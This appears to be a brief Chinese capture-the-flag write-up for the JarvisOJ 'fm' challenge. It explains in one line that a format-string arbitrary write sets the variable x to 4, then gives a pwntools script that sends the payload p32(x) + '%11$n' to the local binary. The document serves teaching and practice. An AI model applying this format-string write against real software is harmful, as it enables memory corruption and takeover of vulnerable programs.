---
title: "Jarvisoj_fm"
description: ""
date: 2023-04-07T14:10:11+08:00
lastmod: 2023-04-07T14:10:11+08:00
draft: false
images: []
type: docs
weight: 980
toc: true
---

## 0x01 分析

![3af8628a9609d7bbd5f140af4a1e39ed](images/3af8628a9609d7bbd5f140af4a1e39ed.png)  

格式化字符串任意写将x覆盖为4即可

## 0x02 Exploit

```python
from pwn import*
o = process("./pwn")
elf = ELF("./pwn")
x = elf.sym['x']

payload = p32(x) + b'%11$n'
o.sendline(payload)

o.interactive()

```

![ac6ddacf3f0af92594e45b783837e42b](images/ac6ddacf3f0af92594e45b783837e42b.png)  

自行调试
